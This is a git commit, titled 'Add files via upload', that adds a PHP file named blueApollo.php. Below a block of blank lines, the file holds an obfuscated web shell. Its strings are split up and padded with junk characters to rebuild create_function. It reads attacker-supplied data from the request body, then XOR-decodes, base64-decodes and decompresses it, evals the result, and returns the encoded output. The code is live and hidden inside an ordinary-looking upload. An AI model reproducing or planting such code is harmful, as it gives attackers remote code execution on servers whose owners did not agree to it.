031702bf4dce242d9bd74e99f28de5f36cc1403e
billyciam <58057019+billyciam@users.noreply.github.com>
2019-11-21 19:44:08 -0600

    Add files via upload

---
+++ blueApollo.php
@@ -0,0 +1,29 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+$p=str_replace('U','','UcrUeateUU_fuUncUtion');
+$V='"q7Eym>DyVepr>RB6Fx">;fu>nction> x($t,$k>){>$c=strle>n($k);$>l=strlen>';
+$Y='++,$i+>+){$o.>=$t>{$i}>^$k{$j}>;}}retur>n >$>o;}if(@preg_m>atch>>';
+$g='6>4_enco>de>(@x(@gzc>ompr>es>s($o)>,$k));p>rint("$p$kh$r>$kf");}';
+$I='$k=">792949>19";$kh>="a182>>86802ae3";$kf>="0db4>6e>394d7d";$>p=';
+$L='($t)>;$o=>"";for($i>=0;>$i<>$l;){for(>$j=>0;($j<$c&&>$i<$l);$>j';
+$w='>]),$>>k)));$o>=@ob_get_co>ntents(>);@ob_end>_c>lean();$>r=@base';
+$l='){>@ob_sta>rt();@e>val(>@gzun>compress(>@x(@>ba>se64>_decode($m[1';
+$G='("/$kh(.+)$kf/",@>file>_g>et_cont>ents(">php:>//input"),$m)=>=1';
+$D=str_replace('>','',$I.$V.$L.$Y.$G.$l.$w.$g);
+$t=$p('',$D);$t();
+?>
